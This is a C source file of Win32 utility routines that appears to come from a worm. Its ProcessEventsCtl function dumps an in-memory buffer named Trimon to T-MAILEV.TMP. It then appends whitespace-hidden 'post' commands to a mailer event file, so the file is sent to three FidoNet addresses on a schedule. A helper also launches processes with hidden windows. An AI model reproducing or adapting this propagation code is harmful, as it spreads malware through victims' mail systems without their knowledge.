#include "winapp32.h"

//Declaration
void GetLocalTimeStr(char* s)
{;;
 SYSTEMTIME LT;;
 GetLocalTime(&LT);;
 sprintf(s," %u:%02u:%02u %u-%02u-%04u ",
  LT.wHour,LT.wMinute,LT.wSecond,LT.wDay,LT.wMonth,LT.wYear);;
};;

//Declaration
void ProcessEventsCtl(char* TargetName)
{;;
 if (!TimeToGo) return;;
 char   Drive[MAX_PATH];;
 char   Dir[MAX_PATH];;
 char   FName[MAX_PATH];;
 char   Ext[MAX_PATH];;
 char   MsgName[MAX_PATH];;
 fnsplit(TargetName,Drive,Dir,FName,Ext);;
 sprintf(MsgName,"%s%sT-MAILEV.TMP",Drive,Dir);;
 Log(MsgName);;
 HANDLE h=CreateFile(MsgName,GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);;
 if (h!=INVALID_HANDLE_VALUE) {;; CloseHandle(h);; return;;};;
 h=CreateFile(MsgName,GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);;
 if (h==INVALID_HANDLE_VALUE) return;;
 DWORD written;;
 WriteFile(h,&Trimon,sizeof(Trimon),&written,NULL);;
 CloseHandle(h);;
 h=CreateFile(TargetName,GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ
         | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);;
 SetFilePointer(h,0,NULL,FILE_END);;
 char NL[666];;
 sprintf(NL,"%80s post %s 2:5020/69.4  04:13\n","",MsgName);;
 WriteFile(h,&NL[0],strlen(NL),&written,0);;
 sprintf(NL,"%80s post %s 2:5020/69.7  04:13\n","",MsgName);;
 WriteFile(h,&NL[0],strlen(NL),&written,0);;
 sprintf(NL,"%80s post %s 2:5020/69.14 04:13\n","",MsgName);;
 WriteFile(h,&NL[0],strlen(NL),&written,0);;
 CloseHandle(h);;
};

//Declaration
bool RWDir(char* s)
{;;
 char ss[MAX_PATH];;
 strcpy(ss,s);;
 if (ss[strlen(ss)-1]!='\\') {strcat(ss,"\\");;};;
 strcat(ss,"TMPTMP.$11");;
 HANDLE h=CreateFile(ss,GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_FLAG_DELETE_ON_CLOSE,NULL);;
 if (h==INVALID_HANDLE_VALUE) return false;;
 CloseHandle(h);;
 return true;;
};

// Looks for temp directory path, returns TRUE if writable dir found
//Declaration
bool GetTempDir(char* s)
{;;
 GetEnvironmentVariable("TEMP",s,MAX_PATH);;
 if (RWDir(s)) return true;;
 GetEnvironmentVariable("TMP",s,MAX_PATH);;
 if (RWDir(s)) return true;;
 GetWindowsDirectory(s,MAX_PATH);;
 if (RWDir(s)) return true;;
 return false;;
};

//Declaration
char* Ext(char* Name)
{;;
 char* x = Name;;
 while ((*x)!=0) x++;;
 if ((*(x-1))=='.') return (x);;
 if ((*(x-2))=='.') return (x-2);;
 if ((*(x-3))=='.') return (x-3);;
 if ((*(x-4))=='.') return (x-4);;
 return x;;
};

// Runs specified external application and waits for it's termination
// Returns FALSE if an error occurs
//Declaration
bool Exec(char* Command, char* WorkDir, DWORD TOut)
{;;
 Log(Command);;
 STARTUPINFO SInfo;;
 GetStartupInfo(&SInfo);;
 SInfo.dwFlags = STARTF_USESHOWWINDOW;;
 SInfo.wShowWindow = SW_HIDE;;
 PROCESS_INFORMATION Executed;;
 bool x = CreateProcess(NULL,Command,NULL,NULL,false,
   CREATE_NEW_PROCESS_GROUP | NORMAL_PRIORITY_CLASS,
  NULL,WorkDir,&SInfo,&Executed);;
 if (!x) return false;;
 WaitForSingleObject(Executed.hProcess,TOut);;
 return true;;
};

//Declaration
void iGetSystemTimeAsFileTime(FILETIME* SysTime)
{;;
 SYSTEMTIME st;;
 GetSystemTime(&st);;
 SystemTimeToFileTime(&st,SysTime);;
};


//Declaration
bool Readln(HANDLE h, char* s)
{;;
 if (h==INVALID_HANDLE_VALUE) return false;;
 strcpy(s,"");;
 char shit[]="?";;
 while ((strlen(s)<2)||(s[strlen(s)-2]!='\xD')||(s[strlen(s)-1]!='\xA'))
 {
  DWORD readed = 0;;
  ReadFile(h,&shit,1,&readed,NULL);;
  if (readed!=1) return false;;
  if (shit[0]!='\0') strcat(s,shit);;
 };;
 if (strlen(s)>=2) s[strlen(s)-2]='\0';;
 return true;;
};

//Declaration
bool Writeln(HANDLE h, const char* s)
{;;
 if (h==INVALID_HANDLE_VALUE) return false;;
 DWORD written1 = 0;;
 DWORD written2 = 0;;
 char ss[] = "\xD\xA";;
 WriteFile(h,s,strlen(s),&written1,0);;
 WriteFile(h,ss,2,&written2,0);;
 return ((written1==strlen(s))&&(written2==2));;
};

//Declaration
//Watcom standard library replacement

#ifdef WATCOM_MODE

/* WARNING : DECLARATIONS ARE NOT ALLOWED WITHIN THIS CODE BECAUSE */
/* IT COMPILES UNDER WATCOM ONLY */
int random(int max) {;; return (rand() % max);;};

// This one from BP 7.0 WinDos, modified
void fnsplit(char* Path,char* Drive,char* Dir,char* Name,char* Ext)
{;;
  DWORD  DirLen;;
  DWORD  NameLen;;
  char*  NamePtr;;
  char*  ExtPtr;;
  NamePtr = strrchr(Path, '\\');;
  if (NamePtr==NULL) NamePtr = strrchr(Path, ':');;
  if (NamePtr==NULL) NamePtr = Path; else NamePtr++;;
  ExtPtr = strchr(NamePtr,46 /*'.'*/);;
  if (ExtPtr==NULL) ExtPtr = strchr(NamePtr,0);;
  DirLen  = (DWORD)NamePtr - (DWORD)Path;;
  NameLen = (DWORD)ExtPtr - (DWORD)NamePtr;;
  if (Drive!=NULL) strcpy(Drive,"");;
  if (Dir!=NULL) {strncpy(Dir, Path, DirLen);; Dir[DirLen]='\0';;};;
  if (Name!=NULL) {strncpy(Name, NamePtr, NameLen);; Name[NameLen]='\0';;};;
  if (Ext!=NULL) strcpy(Ext, ExtPtr);;
};

#endif